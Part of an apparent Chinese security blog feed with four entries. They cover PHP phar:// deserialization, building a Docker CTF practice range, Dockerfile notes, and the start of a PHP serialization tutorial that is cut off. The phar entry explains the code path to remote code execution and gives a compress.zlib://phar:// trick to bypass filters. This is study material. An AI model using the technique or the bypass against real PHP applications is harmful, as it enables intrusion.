    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>在一般的利用反序列化漏洞的时候，我们一般是去查找<code>unserialize()</code>一类的函数。但是随着人们对于反序列化漏洞越来越重视，于是代码的安全性也在不断的提高，想要利用这一类函数的难度也会越来越大。但在18年的<code>black hat</code>上，一位研究员分享了一种思路，也就是利用phar文件会以序列化的形式存储用户自定义的<code>mate-date</code>这一特性拓展了php反序列化漏洞的攻击面。这个方法在文件系统函数参数可控的情况下，配合<code>phar://</code>伪协议，可以不依赖<code>unserialize()</code>直接进行反序列化操作。这会让一些看似安全的函数，产生新的可以利用的点。</p><h2 id="二、phar可以反序列化的原因"><a href="#二、phar可以反序列化的原因" class="headerlink" title="二、phar可以反序列化的原因"></a>二、phar可以反序列化的原因</h2><h4 id="1-Stream-API"><a href="#1-Stream-API" class="headerlink" title="1. Stream API"></a>1. Stream API</h4><ul><li>Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用。phar这个拓展，便注册了<code>phar://</code>这个stream wrapper。通过<code>&lt;?php var_dump(stream_get_wrappers());?&gt;</code>这条指令来查看系统中注册了哪些wrapper<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/psw-2-1-1.png"></li><li>而一个stream wrapper可以实现：打开文件（夹）、删除文件（夹）、重命名文件（夹），以及获取文件的meta这几个功能。</li><li>所以说，像<code>file_get_contents()</code>,<code>unlink()</code>等函数都可以通过这个Stream API进行操作。</li><li>知道创宇404实验室的研究员 seaii所总结的文件函数：<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/psw-2-1-2.png"></li></ul><h4 id="2-phar文件构成"><a href="#2-phar文件构成" class="headerlink" title="2. phar文件构成"></a>2. phar文件构成</h4><ol><li><strong>a stub</strong><br>phar文件的标志，格式为：<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>。该格式必须以<code>__HALT_COMPILER();?&gt;</code>做结尾，但前面内容不限，所以可以写成这样<code>&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</code>来伪装成gif文件。</li><li><strong>a manifest describing the contents</strong><br>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</li><li><strong>the file contents</strong><br>被压缩文件的内容。</li><li><strong>[optional] a signature for verifying Phar integrity (phar file format only)</strong><br>签名，放在文件末尾，格式如下：<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/psw-2-2-1.png"></li><li>phar文件生成格式：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    @unlink(<span class="string">"phar.phar"</span>);</span></span><br><span class="line"><span class="php">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span></span><br><span class="line"><span class="php">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span></span><br><span class="line"><span class="php">    $o = <span class="keyword">new</span> TestObject();</span></span><br><span class="line"><span class="php">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span></span><br><span class="line"><span class="php">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span></span><br><span class="line"><span class="php">    <span class="comment">//签名自动计算</span></span></span><br><span class="line"><span class="php">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>注：</li></ol><ul><li>要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</li><li>此处不能用<code>ini_set()</code>行设置</li></ul><h4 id="3-执行反序列化"><a href="#3-执行反序列化" class="headerlink" title="3. 执行反序列化"></a>3. 执行反序列化</h4><ol><li>phar组件注册的<code>phar://</code>这个wrapper的源码为：<a href="https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c" target="_blank" rel="noopener">源码</a>关键定义为：<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const php_stream_wrapper_ops phar_stream_wops = &#123;</span><br><span class="line"><span class="built_in">    phar_wrapper_open_url,</span></span><br><span class="line"><span class="built_in">    NULL,</span>                  <span class="comment">/* phar_wrapper_close */</span></span><br><span class="line"><span class="built_in">    NULL,</span>                  <span class="comment">/* phar_wrapper_stat, */</span></span><br><span class="line"><span class="built_in">    phar_wrapper_stat,</span>     <span class="comment">/* stat_url */</span></span><br><span class="line"><span class="built_in">    phar_wrapper_open_dir,</span> <span class="comment">/* opendir */</span></span><br><span class="line">    <span class="string">"phar"</span>,</span><br><span class="line"><span class="built_in">    phar_wrapper_unlink,</span>   <span class="comment">/* unlink */</span></span><br><span class="line"><span class="built_in">    phar_wrapper_rename,</span>   <span class="comment">/* rename */</span></span><br><span class="line"><span class="built_in">    phar_wrapper_mkdir,</span>    <span class="comment">/* create directory */</span></span><br><span class="line"><span class="built_in">    phar_wrapper_rmdir,</span>    <span class="comment">/* remove directory */</span></span><br><span class="line">    NULL</span><br><span class="line">&#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li>于是发现这些注册的函数都调用了<code>phar_parse_url</code>,追溯下去，这个函数又调用了<code>phar_open_or_create_filename</code> -&gt; <code>phar_create_or_parse_filename</code> -&gt; <code>phar_open_from_fp</code> -&gt; <code>phar_parse_pharfile</code> -&gt; <code>phar_parse_metadata</code> -&gt; <code>phar_var_unserialize</code>于是便可以构建特殊的phar文件，使得构造的攻击代码被反序列化，从而实现RCE。</li></ol><h2 id="三、文件函数会触发反序列化操作的原因"><a href="#三、文件函数会触发反序列化操作的原因" class="headerlink" title="三、文件函数会触发反序列化操作的原因"></a>三、文件函数会触发反序列化操作的原因</h2><h4 id="1-例"><a href="#1-例" class="headerlink" title="1. 例"></a>1. 例</h4><ul><li>file_get_contents()<br>该函数调用的是：<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stream</span> = php_stream_open_wrapper_ex(filename, <span class="string">"rb"</span> ....)<span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li>unlink()<br>该函数调用的是：<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wrapper</span> = php_stream_locate_url_wrapper(filename, <span class="keyword">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="2-应用"><a href="#2-应用" class="headerlink" title="2. 应用"></a>2. 应用</h4></li><li><code>php_stream_open_wrapper_ex</code>调用了<code>php_stream_locate_url_wrapper</code>，后者的作用是可以通过url来找到对应的wrapper。</li><li>所以当url是<code>phar://</code>伪协议构成的时候，它就会调用phar当时注册的wrapper，也就是上面第二点的wrapper中的函数，最后都会调用到<code>phar_var_unserialize</code></li><li>所以说，所有的调用了<code>php_stream_locate_url_wrapper</code>或<code>php_stream_open_wrapper</code>等相关函数的函数都可以触发该反序列化漏洞，不只是之前图片中的例子。</li><li>例如：<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exif_thumbnail</span><br><span class="line"></span><br><span class="line">hash_file</span><br><span class="line"></span><br><span class="line">get_meta_tags</span><br><span class="line"></span><br><span class="line">pgsqlCopyFromFile  <span class="comment">//PostgreSQL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LOAD</span> DATA <span class="keyword">LOCAL</span> INFILE  <span class="comment">//MySQL</span></span><br></pre></td></tr></table></figure></li><li>当<code>phar://</code>被限制了不能出现在开头字符，还可以通过<code>compress.bzip2://phar://</code>|<code>compress.zlib://phar://</code>来进行绕过。</li></ul><h2 id="四、参考资料"><a href="#四、参考资料" class="headerlink" title="四、参考资料"></a>四、参考资料</h2><ol><li><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">zsx大佬的博客</a></li><li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seaii@知道创宇404实验室</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;p&gt;在一般的利用反序列化漏洞的时候，我们一般是去查找&lt;code&gt;unserialize()&lt;/code&gt;一类的函数。但是随着人们
      
    
    </summary>
    
    
      <category term="漏洞总结" scheme="www.jarvis-cy.com/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="PHP" scheme="www.jarvis-cy.com/tags/PHP/"/>
    
      <category term="反序列化" scheme="www.jarvis-cy.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="phar" scheme="www.jarvis-cy.com/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>使用Docker搭建靶场的踩坑之路</title>
    <link href="www.jarvis-cy.com/2020/03/26/%E4%BD%BF%E7%94%A8Docker%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E7%9A%84%E8%B8%A9%E5%9D%91%E4%B9%8B%E8%B7%AF/"/>
    <id>www.jarvis-cy.com/2020/03/26/%E4%BD%BF%E7%94%A8Docker%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E7%9A%84%E8%B8%A9%E5%9D%91%E4%B9%8B%E8%B7%AF/</id>
    <published>2020-03-26T07:09:55.000Z</published>
    <updated>2020-03-26T08:20:57.260Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>前段时间将php反序列化漏洞学习了一下，于是想着搭建一个靶场，找到CTFD后，看到了别人的靶场都是一键安装，于是萌生自己写Dockerfile来搭建靶场的想法。学习dockerfile以及docker的一些命令的总结放在上一篇博文，这一篇主要记录搭建过程以及所踩得坑。</p><h3 id="二、搭建过程"><a href="#二、搭建过程" class="headerlink" title="二、搭建过程"></a>二、搭建过程</h3><ol><li><p>首先因为是php的题目，所以最先想到的就是LNMP和LAMP。最开始找到的镜像是<code>2233466866/lnmp</code>，通过<code>docker pull 2233466866/lnmp</code>拉到本地。</p></li><li><p>创建好容器后，进入容器，将准备好的 <img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/D_1_2_1.png">放入网站根目录，运行unzip，结果没有找到该命令，但是该镜像的Dockerfile中确实是写了下载<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/D_1_2_2.png">，于是自己下载好后，又进行了nginx与php-fpm的开启，做好端口映射后，靶场运行成功。</p></li><li><p>于是根据上述的过程开始写Dockerfile：<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/D_1_2_3.png"></p></li><li><p>运行这个之后，发现一直报错，在重新在容器中按照Dockerfile中的步骤来的时候，发现nginx无法设置自启动，经过多种设置方法，都没有实现，于是改换为LAMP。</p></li><li><p>在hub.docker.com中找到了<code>webdevops/php-apache-dev</code>。按照第二步的操作，同样试了一下，结果发现找不到这个镜像的网站根目录，根目录并不在<code>/var/www/html</code>中。后面查看他的<a href="https://dockerfile.readthedocs.io/en/latest/content/DockerImages/dockerfiles/php-apache-dev.html" target="_blank" rel="noopener">官方文档</a>，看到了他的配置文件的位置，发现根目录在<code>/app</code>下，重复操作后，靶场运行成功。<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/D_1_2_4.png"><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/D_1_2_5.png"></p></li><li><p>在该镜像中，直接采用了Supervisor完成了对服务的监听、启动、停止、重启。并且，之前的Dockerfile中的COPY命令也可以替换为ADD命令。修改后的内容为：</p><ul><li><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> webdevops/php-apache-dev</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> WWW.tar.gz /app</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"seccess---------------ok"</span></span></span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> supervisord</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>当准备好Dockerfile后，全部的运行流程为</p><pre><code><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">docker build -f Dockerfile -t unserialize:<span class="number">1.0</span> .</span><br><span class="line">docker run -d -p <span class="number">8000</span>:<span class="number">80</span> --name Unserialize unserialize:<span class="number">1.0</span></span><br></pre></td></tr></table></figure></code></pre><p> 后期启动靶场就只需要<code>docker start Unserialize</code>即可</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h3&gt;&lt;p&gt;前段时间将php反序列化漏洞学习了一下，于是想着搭建一个靶场，找到CTFD后，看到了别人的靶场都是一键安装，于是萌生自己写D
      
    
    </summary>
    
    
      <category term="技巧总结" scheme="www.jarvis-cy.com/categories/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="Docker" scheme="www.jarvis-cy.com/tags/Docker/"/>
    
      <category term="Dockerfile" scheme="www.jarvis-cy.com/tags/Dockerfile/"/>
    
  </entry>
  
  <entry>
    <title>DockerFile学习笔记</title>
    <link href="www.jarvis-cy.com/2020/03/25/DockerFile%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>www.jarvis-cy.com/2020/03/25/DockerFile%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-25T10:43:53.000Z</published>
    <updated>2020-03-26T08:20:14.016Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DockerFile体系结构-保留字指令"><a href="#DockerFile体系结构-保留字指令" class="headerlink" title="DockerFile体系结构(保留字指令)"></a>DockerFile体系结构(保留字指令)</h3><table><thead><tr><th align="left">指令</th><th align="center">功能</th><th align="center">提示</th><th align="center">注意</th></tr></thead><tbody><tr><td align="left">FROM</td><td align="center">设置基础镜像</td><td align="center">镜像都是从一个基础镜像（操作系统或其他镜像）生成，可以在一个Dockerfile中添加多条FROM指令，一次生成多个镜像</td><td align="center">在引用时，如果忽略tag选项，会使用latest镜像（最新版本）</td></tr><tr><td align="left">MAINTAINER</td><td align="center">设置镜像作者的姓名和邮箱地址</td><td align="center"></td><td align="center"></td></tr><tr><td align="left">RUN</td><td align="center">构建容器时所需要运行的命令</td><td align="center">RUN指令会生成容器，在容器中执行脚本，容器使用当前镜像，脚本指令完成后，Docker Daemon会将该容器提交为一个中间镜像，供后面的指令使用</td><td align="center"><strong>1.</strong>RUN指令第一种方式为shell方式，使用/bin/sh -c &lt; command&gt;运行脚本，可以在其中使用\将脚本分为多行 <strong>2.</strong>RUN指令第二种方式为exec方式，镜像中没有/bin/sh或者要使用其他shell时使用该方式，其不会调用shell命令</td></tr><tr><td align="left">EXPOSE</td><td align="center">设置镜像暴露端口，记录容器启动时监听哪些端口</td><td align="center">容器启动时，Docker Daemon会扫描镜像中暴露的端口，如果加入-P参数，Docker Daemon会把镜像中所有暴露端口导出，并为每个暴露端口分配一个随机的主机端口（暴露端口是容器监听端口，主机端口为外部访问容器的端口）</td><td align="center">EXPOSE只设置暴露端口并不导出端口，只有启动容器时使用-P/-p才导出端口，这个时候才能通过外部访问容器提供的服务</td></tr><tr><td align="left">WORKDIR</td><td align="center">指定在创建容器后，终端默认登陆的工作目录，一个落脚点</td><td align="center">如果工作目录不存在，则Docker Daemon会自动创建</td><td align="center">Dockerfile中多个地方都可以调用WORKDIR，如果后面跟的是相对位置，则会跟在上条WORKDIR指定路径后（如WORKDIR /A   WORKDIR B   WORKDIR C，最终路径为/A/B/C）</td></tr><tr><td align="left">ENV</td><td align="center">设置镜像中的环境变量</td><td align="center">通过${变量名}或者 $变量名使用变量，使用方式${变量名}时可以用${变量名:-default} ${变量名:+cover}设定默认值或者覆盖值</td><td align="center">环境变量在整个编译周期都有效，带有等号的方式可设置多个环境变量，不带等号的方式只设置一个环境变量</td></tr><tr><td align="left">ADD</td><td align="center">将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</td><td align="center">当镜像中的目标路径不存在则会自动创建目录与缺失的上级目录</td><td align="center">当路径中有空格时，需要用到json字符串的形式</td></tr><tr><td align="left">COPY</td><td align="center">复制文件到镜像中</td><td align="center">指令逻辑和ADD十分相似，同样Docker Daemon会从编译目录寻找文件或目录，dest为镜像中的绝对路径或者相对于WORKDIR的路径</td><td align="center"></td></tr><tr><td align="left">VOLUME</td><td align="center">设置容器的挂载点(用于数据保存和持久话工作)</td><td align="center">启动容器时，Docker Daemon会新建挂载点，并用镜像中的数据初始化挂载点，可以将主机目录或数据卷容器挂载到这些挂载点</td><td align="center"></td></tr><tr><td align="left">CMD</td><td align="center">指定一个容器要启动时运行的命令</td><td align="center">CMD会被docker run 之后的参数替换</td><td align="center">Dockerfile中只能有一条CMD命令，如果写了多条则最后一条生效</td></tr><tr><td align="left">ENTRYPOINT</td><td align="center">设置容器的入口程序(跟CMD所实现的目的相同)</td><td align="center"><code>docker run</code>之后的参数会被当做参数传递给ENTRYPOINT，之后形成新的命令组合</td><td align="center">当Dockerfile有多条ENTRYPOINT时只有最后的ENTRYPOINT指令生效</td></tr><tr><td align="left">ONBUILD</td><td align="center">当构建一个被继承的DockerFile时运行命令，父镜像在被子继承后，父镜像的onbuild被触发</td><td align="center">从该镜像生成子镜像，在子镜像的编译过程中，首先会执行父镜像中的ONBUILD指令，所有编译指令都可以成为钩子指令</td><td align="center"></td></tr></tbody></table><h3 id="指令集的语法与例子："><a href="#指令集的语法与例子：" class="headerlink" title="指令集的语法与例子："></a>指令集的语法与例子：</h3><ol><li>FROM<ul><li>语法：<code>FROM &lt; image&gt;[:&lt; tag&gt; | @&lt; digest&gt;]</code></li><li>例子：<ul><li><code>FROM ubuntu:14.04</code></li><li><code>FROM 2233466866/lnmp</code></li></ul></li></ul></li><li>MAINTAINER <ul><li>语法：<code>MAINTAINER &lt; name&gt;</code></li><li>例子：<code>Jarvis-cy &lt;779054469@qq.com&gt;</code></li></ul></li><li>RUN<ul><li>语法：<ul><li><code>RUN &lt; command&gt;</code></li><li><code>RUN [“executable”,”param1”,”param2”]</code></li></ul></li><li>例子：<ul><li><pre><code>RUN source $HOME/.bashrc;\ echo $HOMERUN [“/bin/bash”,”-c”,”echo hello”]RUN [“sh”,”-c”,”echo”,”$HOME”]</code></pre></li></ul></li></ul></li><li>EXPOSE<ul><li>语法：<code>EXPOSE &lt; port&gt; &lt; port&gt; …</code></li><li>例子：<code>EXPOSE 443</code></li></ul></li><li>WORKDIR<ul><li>语法：<code>WORKDIR &lt; Path&gt;</code></li><li>例子：<code>WORKDIR /var/www/html</code></li></ul></li><li>ENV<ul><li>语法：<code>ENV &lt; key&gt;=&lt; value&gt;…</code>|<code>&lt; key&gt; &lt; value&gt;</code></li><li>例子：<code>ENV CATALINA_HOME /usr/local/tomcat</code></li></ul></li><li>ADD<ul><li>语法：<code>ADD &lt; src&gt;… &lt; dest&gt;</code>|<code>[“&lt; src&gt;”,… “&lt; dest&gt;”]</code></li><li>例子：<code>ADD WWW.tar.gz /app</code></li></ul></li><li>COPY<ul><li>语法：<code>COPY &lt; src&gt;… &lt; dest&gt;</code>|<code>[“&lt; src&gt;”,… “&lt; dest&gt;”]</code></li><li>例子：<code>COPY Unserialize.zip /var/www/html/</code></li></ul></li><li>VOLUME<ul><li>语法：<ul><li><code>VOLUME [“/data”]</code></li><li><code>VOLUME /data1 /data2</code></li></ul></li><li>例子：<code>VOLUME [&quot;/www&quot;,&quot;/data/mysql&quot;,&quot;/sys/fs/cgroup&quot;]</code></li></ul></li><li>CMD<ul><li>语法：<ul><li><code>CMD [“executable”,”param1”,”param2”]</code></li><li><code>CMD [“param1”,”param2”]</code></li><li><code>CMD &lt; command&gt;</code></li><li>CMD第一种、第三种方式和RUN类似，第二种方式为ENTRYPOINT参数方式，为entrypoint提供参数列表 </li></ul></li><li>例子：<ul><li><code>CMD [&quot;/bin/bash&quot;]</code></li><li><code>CMD /bin/bash</code></li></ul></li></ul></li><li>ENTRYPOINT<ul><li>语法：<ul><li><code>ENTRYPOINT [“executable”,”param1”,”param2”]</code></li><li><code>ENTRYPOINT command param1 param2</code>（shell方式） </li></ul></li><li>例子：<code>ENTRYPOINT /bin/bash</code></li></ul></li><li>ONBUILD<ul><li>语法：<code>ONBUILD [INSTRUCTION]</code></li><li>例子：<code>ONBUILD RUN echo &quot;father images onbuild!&quot;</code></li></ul></li></ol><h3 id="使用Dockerfile构建镜像"><a href="#使用Dockerfile构建镜像" class="headerlink" title="使用Dockerfile构建镜像"></a>使用Dockerfile构建镜像</h3><ol><li>为了方便起见，可以将需要传入到容器中的文件提前放到一个文件夹中（包括Dockerfile），然后在文件夹中运行相应命令。</li><li>在准备好之后，启动docker：<code>service docker start</code>|<code>systemctl start docker</code></li><li>输入命令：<code>docker build -f Dockerfile -t unserialize:1.0 .</code>此处的<code>unserialize:1.0</code>为你要创建的镜像的名称与版本号，版本号默认latest</li><li>创建成功后，可通过<code>docker images</code>查看创建好后的镜像</li></ol><h3 id="使用镜像创建容器"><a href="#使用镜像创建容器" class="headerlink" title="使用镜像创建容器"></a>使用镜像创建容器</h3><ol><li>输入命令：<code>docker run -d -p 8000:80 --name Unserialize unserialize:1.0</code><ul><li><code>--name</code>:后面跟的参数为创建的容器的名称</li><li><code>-d</code>:后台运行容器，并返回容器ID</li><li><code>-p 8000:80</code>:将容器内的80端口映射到宿主机的8000端口上</li></ul></li><li>创建好后会返回该容器的<code>CONTAINER ID</code>，此时可以通过<code>docker ps</code>查看容器运行情况</li><li>在关闭容器后，可通过<code>docker start 容器名称或ID</code>来实现容器的开启</li><li>如果需要进入容器，并运行bash，可以输入<code>docker exec -it 容器名称或ID /bin/bash</code></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;DockerFile体系结构-保留字指令&quot;&gt;&lt;a href=&quot;#DockerFile体系结构-保留字指令&quot; class=&quot;headerlink&quot; title=&quot;DockerFile体系结构(保留字指令)&quot;&gt;&lt;/a&gt;DockerFile体系结构(保留字指令)&lt;/h3
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="www.jarvis-cy.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Docker" scheme="www.jarvis-cy.com/tags/Docker/"/>
    
      <category term="Dockerfile" scheme="www.jarvis-cy.com/tags/Dockerfile/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="www.jarvis-cy.com/2020/03/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>www.jarvis-cy.com/2020/03/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-03-15T03:45:40.000Z</published>
    <updated>2020-04-14T08:39:43.767Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="1-序列化与反序列化"><a href="#1-序列化与反序列化" class="headerlink" title="1.序列化与反序列化"></a>1.序列化与反序列化</h3><h5 id="1-1什么是序列化（反序列化）："><a href="#1-1什么是序列化（反序列化）：" class="headerlink" title="1.1什么是序列化（反序列化）："></a>1.1什么是序列化（反序列化）：</h5><ul><li>序列化是将变量（对象）转换为可保存或传输的字符串的过程</li><li>反序列化就是在适当的时候把这个字符串再转换成​​原来的变量（对象）使用。</li></ul><h5 id="1-2常见函数："><a href="#1-2常见函数：" class="headerlink" title="1.2常见函数："></a>1.2常见函数：</h5><ul><li>Serialize(): <code>string serialize ( mixed $value )</code><ul><li>$value: 要序列化的对象或数组</li><li>函数用于序列化对象或数组，并返回一个字符串</li></ul></li><li>Unserialize(): <code>mixed unserialize ( string $str )</code><ul><li>$str: 序列化后的字符串</li><li>函数用于将通过 serialize() 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构</li></ul></li><li>json_encode(): <code>string json_encode ( mixed $value [, int $options = 0 [, int $depth = 512 ]] )</code><ul><li>待编码的$value ，除了resource 类型之外，可以为任何数据类型。所有字符串数据的编码必须是 UTF-8。</li><li>对变量进行 JSON 编码，返回字符串，包含了 value 值 JSON 形式的表示。</li></ul></li><li>json_decode(): <code>mixed json_decode ( string $json [, bool $assoc = FALSE [, int $depth = 512 [, int $options = 0 ]]] )</code><ul><li>待解码的 $json string 格式的字符串，这个函数仅能处理 UTF-8 编码的数据</li><li>对 JSON 格式的字符串进行解码，接受一个 JSON 编码的字符串并且把它转换为 PHP 变量</li></ul></li></ul><h5 id="1-3-序列化之后的格式："><a href="#1-3-序列化之后的格式：" class="headerlink" title="1.3 序列化之后的格式："></a>1.3 序列化之后的格式：</h5><table><thead><tr><th align="center">字符</th><th>含义</th><th align="center">格式</th><th>字符</th><th>含义</th></tr></thead><tbody><tr><td align="center">s</td><td>string</td><td align="center">s:size:value;</td><td>d</td><td>double</td></tr><tr><td align="center">b</td><td>boolean</td><td align="center">b:value;(保存1或0)</td><td>C</td><td>custom object</td></tr><tr><td align="center">a</td><td>array</td><td align="center">a:size:{key definition;value definition;(repeated per element)}</td><td>o</td><td>common object</td></tr><tr><td align="center">i</td><td>integer</td><td align="center">i:value;</td><td>N</td><td>null</td></tr><tr><td align="center">O</td><td>class</td><td align="center">O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</td><td>R</td><td>pointer reference</td></tr><tr><td align="center">r</td><td>reference</td><td align="center"></td><td>U</td><td>unicode string</td></tr></tbody></table><ul><li>Example:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CC</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $ data;</span><br><span class="line"><span class="keyword">private</span> $ pass;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data, $pass)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$number = <span class="number">34</span>;</span><br><span class="line">$str = <span class="string">'uusama'</span>;</span><br><span class="line">$bool = <span class="keyword">true</span>;</span><br><span class="line">$null = <span class="keyword">NULL</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">1</span>, <span class="string">'b'</span> =&gt; <span class="number">2</span>);</span><br><span class="line">$cc = <span class="keyword">new</span> CC(<span class="string">'uu'</span>, <span class="keyword">true</span>);</span><br><span class="line">var_dump(serialize($number));</span><br><span class="line">var_dump(serialize($str));</span><br><span class="line">var_dump(serialize($bool));</span><br><span class="line">var_dump(serialize($null));</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">var_dump(serialize($cc));</span><br></pre></td></tr></table></figure></li></ul><ul><li>输出结果：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 